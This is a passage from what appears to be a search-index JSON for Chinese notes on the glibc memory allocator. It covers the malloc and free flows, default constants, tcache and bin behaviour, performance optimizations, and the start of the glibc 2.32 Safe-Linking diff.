\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4e2a\u6570\u200b\uff0c\u200b\u5982\u679c\u200b\u8d85\u8fc7\u200b\u4e86\u200b\u9608\u503c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e4b\u524d\u200b\u5df2\u7ecf\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u6b63\u597d\u200b\u662f\u200b\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u540c\u65f6\u200b\u632a\u5230\u200b\u4e86\u200b tcache \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u5219\u200b\u7acb\u5373\u200b\u628a\u200b\u8fd9\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4ece\u200b tcache \u200b\u4e2d\u200b\u53d6\u51fa\u200b\u5e76\u200b\u5206\u914d\u200b\u7ed9\u200b malloc \u200b\u8c03\u7528\u8005\u200b\uff0c\u200b\u7136\u540e\u200b\u51fd\u6570\u200b\u7ed3\u675f\u200b\uff1b\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u907f\u514d\u200b\u5904\u7406\u200b\u592a\u200b\u591a\u200b\u65e0\u5173\u200b\u7684\u200b unsorted bin \u200b\u4e2d\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u5bfc\u81f4\u200b malloc \u200b\u8c03\u7528\u200b\u65f6\u95f4\u200b\u8fc7\u957f\u200b</li> </ol> </li> <li>\u200b\u5982\u679c\u200b\u5728\u200b\u904d\u5386\u200b unsorted bin \u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u627e\u5230\u200b\u4e86\u200b\u548c\u200b\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\u4e00\u6837\u200b\u5927\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5df2\u7ecf\u200b\u5728\u200b tcache \u200b\u5f53\u4e2d\u200b\u4e86\u200b\uff0c\u200b\u5219\u200b\u7acb\u5373\u200b\u628a\u200b\u8fd9\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4ece\u200b tcache \u200b\u4e2d\u200b\u53d6\u51fa\u200b\u5e76\u200b\u5206\u914d\u200b\u7ed9\u200b malloc \u200b\u8c03\u7528\u8005\u200b\uff0c\u200b\u7136\u540e\u200b\u51fd\u6570\u200b\u7ed3\u675f\u200b</li> <li>\u200b\u5224\u65ad\u200b chunk size \u200b\u5927\u5c0f\u200b\uff0c\u200b\u5982\u679c\u200b\u5c5e\u4e8e\u200b large bin \u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5219\u200b\u627e\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b large bin\uff0c\u200b\u4ece\u5c0f\u5230\u5927\u200b\u901a\u8fc7\u200b nextsize \u200b\u94fe\u8868\u200b\u904d\u5386\u200b large bin \u200b\u4e2d\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u8db3\u591f\u200b\u5927\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u5bf9\u200b\u5b83\u200b\u8fdb\u884c\u200b\u62c6\u5206\u200b\uff0c\u200b\u524d\u9762\u200b\u7684\u200b\u90e8\u5206\u200b\u662f\u200b\u5206\u914d\u200b\u7ed9\u200b malloc \u200b\u8c03\u7528\u8005\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u540e\u9762\u200b\u7684\u200b\u90e8\u5206\u200b\u5219\u200b\u653e\u200b\u56de\u5230\u200b unsorted bin\uff0c\u200b\u7136\u540e\u200b\u51fd\u6570\u200b\u7ed3\u675f\u200b</li> <li>\u200b\u6839\u636e\u200b chunk size \u200b\u5927\u5c0f\u200b\uff0c\u200b\u627e\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b small bin \u200b\u6216\u8005\u200b large bin\uff0c\u200b\u7136\u540e\u200b\u4ece\u5c0f\u5230\u5927\u200b\u904d\u5386\u200b\u5404\u4e2a\u200b bin\uff08\u200b\u53ef\u80fd\u200b\u4ece\u200b small bin \u200b\u4e00\u8def\u200b\u904d\u5386\u200b\u5230\u200b large bin\uff09\uff0c\u200b\u901a\u8fc7\u200b bitmap \u200b\u8df3\u8fc7\u200b\u90a3\u4e9b\u200b\u7a7a\u200b\u7684\u200b bin\uff0c\u200b\u627e\u5230\u200b\u7b2c\u4e00\u4e2a\u200b\u975e\u7a7a\u200b\u7684\u200b bin \u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u5bf9\u200b\u5b83\u200b\u8fdb\u884c\u200b\u62c6\u5206\u200b\uff0c\u200b\u524d\u9762\u200b\u7684\u200b\u90e8\u5206\u200b\u662f\u200b\u5206\u914d\u200b\u7ed9\u200b malloc \u200b\u8c03\u7528\u8005\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u540e\u9762\u200b\u7684\u200b\u90e8\u5206\u200b\u5219\u200b\u653e\u200b\u56de\u5230\u200b unsorted bin\uff0c\u200b\u7136\u540e\u200b\u51fd\u6570\u200b\u7ed3\u675f\u200b</li> <li>\u200b\u5982\u679c\u200b top chunk \u200b\u8db3\u591f\u200b\u5927\u200b\uff0c\u200b\u5219\u200b\u5bf9\u200b\u5b83\u200b\u8fdb\u884c\u200b\u62c6\u5206\u200b\uff0c\u200b\u524d\u9762\u200b\u7684\u200b\u90e8\u5206\u200b\u662f\u200b\u5206\u914d\u200b\u7ed9\u200b malloc \u200b\u8c03\u7528\u8005\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u540e\u9762\u200b\u7684\u200b\u90e8\u5206\u200b\u6210\u4e3a\u200b\u65b0\u200b\u7684\u200b top chunk\uff0c\u200b\u7136\u540e\u200b\u51fd\u6570\u200b\u7ed3\u675f\u200b</li> <li>\u200b\u5982\u679c\u200b\u6b64\u65f6\u200b fast bin \u200b\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u8c03\u7528\u200b malloc_consolidate\uff0c\u200b\u7136\u540e\u200b\u56de\u5230\u200b\u65e0\u9650\u200b\u5faa\u73af\u200b\u7684\u200b\u5f00\u5934\u200b\u518d\u200b\u5c1d\u8bd5\u200b\u4e00\u6b21\u200b\u5206\u914d\u200b</li> <li>\u200b\u6700\u540e\u200b\u7684\u200b\u515c\u5e95\u200b\u5206\u914d\u200b\u65b9\u6cd5\u200b\uff1a\u200b\u8c03\u7528\u200b <code>sysmalloc</code>\uff0c\u200b\u901a\u8fc7\u200b mmap \u200b\u6216\u200b sbrk \u200b\u5411\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7533\u8bf7\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u5185\u5b58\u200b</li> </ol>"},{"location":"software/glibc_allocator.html#free_4","title":"free","text":"<p>\u200b\u5728\u200b\u8fd9\u91cc\u200b\u5217\u51fa\u200b\u5b8c\u6574\u200b\u7684\u200b free \u200b\u6d41\u7a0b\u200b\uff1a</p> <ol> <li>free \u200b\u7684\u200b\u5165\u53e3\u200b\u662f\u200b <code>__libc_free (void *mem)</code> \u200b\u51fd\u6570\u200b</li> <li>\u200b\u5982\u679c\u200b\u914d\u7f6e\u200b\u4e86\u200b free hook\uff0c\u200b\u5219\u200b\u8c03\u7528\u200b free hook\uff0c\u200b\u76f4\u63a5\u200b\u8fd4\u56de\u200b</li> <li>\u200b\u5982\u679c\u200b\u662f\u200b\u8c03\u7528\u200b <code>free(NULL)</code>\uff0c\u200b\u76f4\u63a5\u200b\u8fd4\u56de\u200b</li> <li>\u200b\u68c0\u67e5\u200b <code>mchunk_size</code> \u200b\u7684\u200b <code>IS_MAPPED</code> \u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u5982\u679c\u200b\u5b83\u200b\u4e4b\u524d\u200b\u662f\u200b\u901a\u8fc7\u200b mmap \u200b\u5206\u914d\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5bf9\u200b\u5b83\u200b\u8fdb\u884c\u200b munmap\uff0c\u200b\u7136\u540e\u200b\u8fd4\u56de\u200b</li> <li>\u200b\u5982\u679c\u200b tcache \u200b\u8fd8\u200b\u6ca1\u200b\u521d\u59cb\u5316\u200b\uff0c\u200b\u5c31\u200b\u521d\u59cb\u5316\u200b tcache</li> <li>\u200b\u627e\u5230\u200b\u8fd9\u4e2a\u200b chunk \u200b\u4ece\u200b\u54ea\u4e2a\u200b arena \u200b\u5206\u914d\u200b\u7684\u200b\uff1a\u200b\u68c0\u67e5\u200b <code>mchunk_size</code> \u200b\u7684\u200b <code>NON_MAIN_ARENA</code> \u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u5982\u679c\u200b\u5b83\u200b\u4e0d\u662f\u200b\u4ece\u200b main arena \u200b\u5206\u914d\u200b\u7684\u200b\uff0c\u200b\u5219\u200b\u6839\u636e\u200b chunk \u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u627e\u5230\u200b heap \u200b\u7684\u200b\u5730\u5740\u200b\uff08heap \u200b\u7684\u200b\u5927\u5c0f\u200b\u662f\u200b\u6709\u200b\u4e0a\u9650\u200b\u7684\u200b\uff0c\u200b\u5e76\u4e14\u200b heap \u200b\u7684\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\u662f\u200b\u5bf9\u9f50\u200b\u5230\u200b <code>HEAP_MAX_SIZE</code> \u200b\u7684\u200b\u6574\u200b\u500d\u6570\u200b\u8fb9\u754c\u200b\u7684\u200b\uff09\uff0c\u200b\u518d\u200b\u6839\u636e\u200b heap \u200b\u5f00\u5934\u200b\u7684\u200b heap_info \u200b\u627e\u5230\u200b arena \u200b\u7684\u200b\u5730\u5740\u200b</li> <li>\u200b\u8fdb\u5165\u200b <code>_int_free</code>\uff0c\u200b\u63a5\u7740\u200b\u5206\u6790\u200b <code>_int_free</code> \u200b\u7684\u200b\u5b9e\u73b0\u200b</li> <li>\u200b\u6839\u636e\u200b chunk size \u200b\u627e\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b tcache bin\uff0c\u200b\u5982\u679c\u200b\u5b83\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u6ee1\u200b\uff0c\u200b\u5219\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u653e\u5230\u200b tcache \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u7136\u540e\u200b\u8fd4\u56de\u200b</li> <li>\u200b\u5224\u65ad\u200b chunk size \u200b\u5927\u5c0f\u200b\uff0c\u200b\u5982\u679c\u200b\u5bf9\u5e94\u200b fast bin \u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\uff0c\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u653e\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b fast bin \u200b\u7684\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u4e2d\u200b\uff0c\u200b\u7136\u540e\u200b\u8fd4\u56de\u200b\uff1b\u200b\u6ce8\u610f\u200b\u6b64\u65f6\u200b\u6ca1\u6709\u200b\u83b7\u53d6\u200b arena \u200b\u7684\u200b\u9501\u200b\uff0c\u200b\u6240\u4ee5\u200b fast bin \u200b\u7684\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u7528\u5230\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\uff0c\u200b\u540c\u7406\u200b malloc \u200b\u4e2d\u200b\u5bf9\u200b fast bin \u200b\u7684\u200b\u64cd\u4f5c\u200b\u4e5f\u200b\u8981\u200b\u7528\u5230\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5373\u4f7f\u200b malloc \u200b\u6301\u6709\u200b\u4e86\u200b arena \u200b\u7684\u200b\u9501\u200b</li> <li>\u200b\u83b7\u53d6\u200b arena \u200b\u7684\u200b\u9501\u200b\uff0c\u200b\u5c1d\u8bd5\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u548c\u200b\u5728\u200b\u5185\u5b58\u200b\u4e2d\u200b\u76f8\u90bb\u200b\u7684\u200b\u524d\u540e\u200b\u7a7a\u95f2\u200b\u5757\u200b\u8fdb\u884c\u200b\u5408\u5e76\u200b\uff0c\u200b\u5408\u5e76\u200b\u540e\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u653e\u5165\u200b unsorted bin\uff1b\u200b\u5408\u5e76\u200b\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b\u88ab\u200b\u5408\u5e76\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5df2\u7ecf\u200b\u5728\u200b small bin \u200b\u6216\u8005\u200b large bin \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u5229\u7528\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u628a\u200b\u5b83\u200b\u4ece\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u4e2d\u200b\u5220\u9664\u200b\uff1b\u200b\u5982\u679c\u200b\u548c\u200b top chunk \u200b\u76f8\u90bb\u200b\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5408\u5e76\u200b\u5230\u200b top chunk \u200b\u4e0a\u200b\uff0c\u200b\u7136\u540e\u200b\u8fd4\u56de\u200b</li> <li>\u200b\u5982\u679c\u200b\u91ca\u653e\u200b\u7684\u200b\u5757\u200b\u6bd4\u8f83\u200b\u5927\u200b\uff0c\u200b\u8d85\u8fc7\u200b\u4e86\u200b\u9608\u503c\u200b\uff0c\u200b\u5219\u200b\u89e6\u53d1\u200b\u4e00\u6b21\u200b malloc_consolidate</li> </ol>"},{"location":"software/glibc_allocator.html#_6","title":"\u5404\u79cd\u200b\u5e38\u91cf\u200b\u7684\u200b\u9ed8\u8ba4\u503c","text":"<p>\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b glibc \u200b\u5185\u5b58\u200b\u5206\u914d\u5668\u200b\u5404\u200b\u5e38\u91cf\u200b\u5728\u200b 64 \u200b\u4f4d\u4e0b\u200b\u7684\u200b\u9ed8\u8ba4\u503c\u200b\uff1a</p> <ol> <li><code>MALLOC_ALIGNMENT = max(2 * SIZE_SZ, __alignof__ (long double))</code> \u200b\u7b49\u4e8e\u200b 16</li> <li><code>MIN_CHUNK_SIZE = offsetof(struct malloc_chunk, fd_nextsize)</code> \u200b\u7b49\u4e8e\u200b 32</li> <li><code>MINSIZE = alignUp(MIN_CHUNK_SIZE, MALLOC_ALIGNMENT)</code> \u200b\u7b49\u4e8e\u200b 32</li> <li><code>MAX_FAST_SIZE = 80 * SIZE_SZ / 4</code> \u200b\u7b49\u4e8e\u200b 160</li> <li><code>NSMALLBINS = 64</code></li> <li><code>MIN_LARGE_SIZE = (NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH</code> \u200b\u7b49\u4e8e\u200b 1024</li> <li><code>DEFAULT_MMAP_THRESHOLD_MIN = 128 * 1024</code> \u200b\u5373\u200b 128KB</li> <li><code>DEFAULT_MMAP_THRESHOLD_MAX = 4 * 1024 * 1024 * sizeof(long)</code> \u200b\u5373\u200b 32MB</li> <li><code>HEAP_MIN_SIZE = 32 * 1024</code> \u200b\u5373\u200b 32KB</li> <li><code>HEAP_MAX_SIZE = 2 * DEFAULT_MMAP_THRESHOLD_MAX</code> \u200b\u5373\u200b 64MB</li> <li><code>TCACHE_MAX_BINS = 64</code></li> <li><code>TCACHE_FILL_COUNT = 7</code></li> <li><code>NFASTBINS = fastbin_index(request2size(MAX_FAST_SIZE)) + 1</code> \u200b\u5373\u200b 10</li> <li><code>NBINS = 128</code></li> <li><code>DEFAULT_MXFAST = 64 * sizeof(size_t) / 4</code> \u200b\u5373\u200b 128</li> </ol> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u5404\u4e2a\u200b bin \u200b\u8d1f\u8d23\u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\u8303\u56f4\u200b\uff1a</p> <ol> <li>tcache: \u200b\u5757\u200b\u5927\u5c0f\u200b\u4e0d\u200b\u8d85\u8fc7\u200b 1040 \u200b\u5b57\u8282\u200b\uff0c\u200b\u5bf9\u5e94\u200b <code>malloc(1032)</code> \u200b\u6216\u200b\u66f4\u200b\u5c0f\u200b</li> <li>fast bin: \u200b\u5757\u200b\u5927\u5c0f\u200b\u4e0d\u200b\u8d85\u8fc7\u200b 128 \u200b\u5b57\u8282\u200b\uff0c\u200b\u5bf9\u5e94\u200b <code>malloc(120)</code> \u200b\u6216\u200b\u66f4\u200b\u5c0f\u200b</li> <li>small bin: \u200b\u5757\u200b\u5927\u5c0f\u200b\u4e0d\u200b\u8d85\u8fc7\u200b 1008 \u200b\u5b57\u8282\u200b\uff0c\u200b\u5bf9\u5e94\u200b <code>malloc(1000)</code> \u200b\u6216\u200b\u66f4\u200b\u5c0f\u200b</li> <li>large bin: \u200b\u5757\u200b\u5927\u5c0f\u200b\u4e0d\u200b\u5c0f\u4e8e\u200b 1024 \u200b\u5b57\u8282\u200b\uff0c\u200b\u4e0d\u200b\u8d85\u8fc7\u200b 131056 \u200b\u5b57\u8282\u200b\uff0c\u200b\u5bf9\u5e94\u200b <code>malloc(1001)</code> \u200b\u5230\u200b <code>malloc(131048)</code> \u200b\u7684\u200b\u8303\u56f4\u200b\uff0c\u200b\u66f4\u5927\u200b\u7684\u200b\u5185\u5b58\u200b\u5206\u914d\u200b\u4f1a\u200b\u76f4\u63a5\u200b\u8d70\u200b mmap</li> </ol>"},{"location":"software/glibc_allocator.html#_7","title":"\u6027\u80fd\u200b\u4f18\u5316","text":"<p>\u200b\u7b80\u5355\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b glibc \u200b\u5185\u5b58\u200b\u5206\u914d\u5668\u200b\u7684\u200b\u5404\u79cd\u200b\u6027\u80fd\u200b\u4f18\u5316\u200b\u7279\u6027\u200b\uff1a</p> <ol> <li>tcache \u200b\u4f5c\u4e3a\u200b\u4e00\u4e2a\u200b thread local \u200b\u7684\u200b\u7ed3\u6784\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u9501\u200b\uff0c\u200b\u6027\u80fd\u200b\u662f\u200b\u6700\u597d\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5c3d\u91cf\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u90fd\u200b\u4e22\u200b\u5230\u200b tcache \u200b\u91cc\u9762\u200b\uff0c\u200b\u65e0\u8bba\u662f\u200b\u521a\u200b free \u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u8fd8\u662f\u200b\u5728\u200b malloc \u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u987a\u5e26\u200b\u628a\u200b\u4e00\u4e9b\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4ece\u200b fast bin \u200b\u6216\u8005\u200b small bin \u200b\u4e22\u200b\u5230\u200b tcache \u200b\u91cc\u200b\uff0c\u200b\u8fd9\u6837\u200b\u4e5f\u200b\u51cf\u5c11\u200b\u4e86\u200b lock arena \u200b\u7684\u200b\u6b21\u6570\u200b</li> <li>fast bin \u200b\u867d\u7136\u200b\u4e0d\u518d\u200b\u662f\u200b thread local\uff0c\u200b\u4f46\u200b\u5b83\u200b\u5728\u200b free \u200b\u8def\u5f84\u200b\u4e0a\u200b\u4f7f\u7528\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u6765\u200b\u4ee3\u66ff\u200b\u9501\u200b\uff0c\u200b\u4f7f\u5f97\u200b free \u200b\u5728\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u4e0d\u200b\u9700\u8981\u200b\u83b7\u53d6\u200b arena \u200b\u7684\u200b\u9501\u200b\uff1b\u200b\u800c\u200b\u628a\u200b fast bin \u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5408\u5e76\u200b\u64cd\u4f5c\u200b\u632a\u5230\u200b malloc \u200b\u4e2d\u200b\u8fdb\u884c\u200b\uff0c\u200b\u6b64\u65f6\u200b arena \u200b\u7684\u200b\u9501\u200b\u662f\u200b lock \u200b\u72b6\u6001\u200b\uff0c\u200b\u5c3d\u91cf\u200b\u5728\u200b\u4e00\u6b21\u200b lock \u200b\u7684\u200b\u4e34\u754c\u200b\u533a\u91cc\u200b\u505a\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u4e8b\u60c5\u200b\uff0c\u200b\u51cf\u5c11\u200b lock \u200b\u7684\u200b\u6b21\u6570\u200b</li> <li>small bin \u200b\u548c\u200b large bin \u200b\u7684\u200b\u533a\u5206\u200b\uff0c\u200b\u4e3b\u8981\u200b\u662f\u200b\u8003\u8651\u200b\u5230\u200b\u4e86\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u5206\u5e03\u200b\uff0c\u200b\u8d8a\u5927\u200b\u503e\u5411\u200b\u4e8e\u200b\u8d8a\u200b\u7a00\u758f\u200b\uff1b\u200b\u4ee3\u4ef7\u200b\u662f\u200b large bin \u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7ef4\u62a4\u200b nextsize \u200b\u94fe\u8868\u200b\u6765\u200b\u5feb\u901f\u200b\u5730\u200b\u5bfb\u627e\u200b\u4e0d\u540c\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b</li> <li>\u200b\u5728\u200b\u56de\u6536\u200b unsorted bin \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u8fdb\u884c\u200b\u4e00\u4e2a\u200b\u5185\u5b58\u200b\u5c40\u90e8\u6027\u200b\u4f18\u5316\u200b\uff0c\u200b\u5373\u200b\u503e\u5411\u200b\u4e8e\u200b\u8fde\u7eed\u200b\u5730\u200b\u4ece\u200b\u540c\u4e00\u4e2a\u200b\u5757\u200b\u4e2d\u5207\u200b\u51fa\u5c0f\u5757\u200b\u7528\u4e8e\u200b\u5206\u914d\u200b\uff0c\u200b\u9002\u5408\u200b\u5728\u200b\u5faa\u73af\u200b\u4e2d\u200b\u5206\u914d\u5185\u5b58\u200b\u7684\u200b\u573a\u666f\u200b</li> <li>\u200b\u56de\u6536\u200b unsorted bin \u200b\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b\u9047\u5230\u200b\u4e86\u200b\u6b63\u597d\u200b\u548c\u200b\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\u76f8\u540c\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u65f6\u200b\uff0c\u200b\u5148\u4e0d\u6025\u200b\u7740\u200b\u5206\u914d\u200b\uff0c\u200b\u800c\u662f\u200b\u4e22\u200b\u5230\u200b tcache \u200b\u4e2d\u200b\uff0c\u200b\u7136\u540e\u200b\u7ee7\u7eed\u200b\u5f80\u524d\u200b\u56de\u6536\u200b\u82e5\u5e72\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u76f4\u5230\u200b tcache \u200b\u6ee1\u200b\u4e86\u200b\u6216\u8005\u200b\u9047\u5230\u200b\u4e86\u200b\u8db3\u591f\u200b\u591a\u200b\u7684\u200b\u5927\u5c0f\u200b\u4e0d\u540c\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4e3a\u6b62\u200b\uff1a\u200b\u8fd9\u662f\u200b\u5229\u7528\u200b\u4e86\u200b unsorted bin \u200b\u4e2d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5927\u5c0f\u200b\u7684\u200b\u5c40\u90e8\u6027\u200b\uff0c\u200b\u6709\u200b\u673a\u4f1a\u200b\u628a\u200b\u4e00\u7cfb\u5217\u200b\u8fde\u7eed\u200b\u7684\u200b\u76f8\u540c\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u62ff\u5230\u200b tcache \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u9650\u5236\u200b\u4e86\u200b\u641c\u7d22\u200b\u7684\u200b\u957f\u5ea6\u200b\uff0c\u200b\u907f\u514d\u200b\u5e26\u6765\u200b\u8fc7\u591a\u200b\u989d\u5916\u200b\u7684\u200b\u5ef6\u8fdf\u200b</li> <li>\u200b\u5982\u679c\u200b\u5c1d\u8bd5\u200b\u4e86\u200b unsorted bin\u3001small bin\u3001large bin \u200b\u548c\u200b top chunk \u200b\u90fd\u200b\u65e0\u6cd5\u200b\u5206\u914d\u200b\uff0c\u200b\u6700\u540e\u200b\u518d\u200b\u68c0\u67e5\u200b\u4e00\u6b21\u200b fast bin \u200b\u662f\u5426\u200b\u4e3a\u7a7a\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b\u7a7a\u200b\u7684\u200b\uff0c\u200b\u5219\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b consolidate\uff0c\u200b\u628a\u200b fast bin \u200b\u91cc\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4e22\u200b\u5230\u200b unsorted bin \u200b\u4e2d\u200b\uff0c\u200b\u518d\u200b\u91cd\u65b0\u200b\u5c1d\u8bd5\u200b\u5206\u914d\u200b\u4e00\u6b21\u200b\uff1a\u200b\u6ce8\u610f\u200b\u8fd9\u200b\u6574\u4e2a\u200b\u8fc7\u7a0b\u200b malloc \u200b\u90fd\u200b\u662f\u200b\u6301\u6709\u200b arena \u200b\u9501\u200b\u7684\u200b\uff0c\u200b\u800c\u200b fast bin \u200b\u5728\u200b free \u200b\u4e2d\u200b\u7684\u200b\u5199\u5165\u200b\u662f\u200b\u4e0d\u200b\u9700\u8981\u200b\u6301\u6709\u200b arena \u200b\u9501\u200b\u7684\u200b\uff0c\u200b\u800c\u662f\u200b\u76f4\u63a5\u200b\u7528\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u66f4\u65b0\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u662f\u200b\u8003\u8651\u200b\u5230\u200b\u5176\u4ed6\u200b\u7ebf\u7a0b\u200b\u5728\u200b\u540c\u65f6\u200b\u5f80\u200b\u540c\u4e00\u4e2a\u200b arena free \u200b\u7684\u200b\u60c5\u51b5\u200b</li> <li>\u200b\u5728\u200b\u5408\u5e76\u200b\u76f8\u90bb\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u88ab\u200b\u5408\u5e76\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u53ef\u80fd\u200b\u5df2\u7ecf\u200b\u5728\u200b unsorted bin\u3001small bin \u200b\u6216\u8005\u200b large bin \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u80fd\u591f\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4ece\u200b\u8fd9\u4e9b\u200b bin \u200b\u91cc\u200b\u5220\u9664\u200b\uff0c\u200b\u7528\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u6765\u200b\u5b9e\u73b0\u200b O(1) \u200b\u65f6\u95f4\u200b\u7684\u200b\u5220\u9664\u200b</li> </ol>"},{"location":"software/glibc_allocator.html#_8","title":"\u540e\u7eed\u200b\u7248\u672c\u200b\u66f4\u65b0","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u8bb0\u5f55\u200b glibc 2.31 \u200b\u540e\u7eed\u200b\u7248\u672c\u200b\u5bf9\u200b\u5206\u914d\u5668\u200b\u7684\u200b\u66f4\u65b0\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#glibc-232","title":"glibc 2.32","text":"<p>glibc 2.32 \u200b\u5728\u200b 2.31 \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u6709\u200b\u5982\u4e0b\u200b\u7684\u200b\u4fee\u6539\u200b\uff1a</p> <pre><code>$ git diff glibc-2.31 glibc-2.32 -- malloc/malloc.c\n</code></pre> <pre><code>diff --git a/malloc/malloc.c b/malloc/malloc.c\nindex f7cd29bc2f..ee87ddbbf9 100644\n--- a/malloc/malloc.c\n+++ b/malloc/malloc.c\n@@ -327,6 +327,18 @@ __malloc_assert (const char *assertion, const char *file, unsigned int line,\n # define MAX_TCACHE_COUNT UINT16_MAX\n #endif\n\n+/* Safe-Linking:\n+   Use randomness from ASLR (mmap_base) to protect single-linked lists\n+   of Fast-Bins and TCache.  That is, mask the \"next\" pointers of the\n+   lists' chunks, and also perform allocation alignment checks on them.\n+   This mechanism reduces the risk of pointer hijacking, as was done with\n+   Safe-Unlinking in the double-linked lists of Small-Bins.\n+   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with\n+   larger pages provide less entropy, although the pointer mangling\n+   still works.  */\n+#define PROTECT_PTR(pos, ptr) \\\n+  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))\n+#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)\n\n /*\n   REALLOC_ZERO_BYTES_FREES should be set if a call to\n@@ -1620,7 +1632,7 @@ static INTERNAL_SIZE_T global_max_fast;\n  */\n\n #define set_max_fast(s) 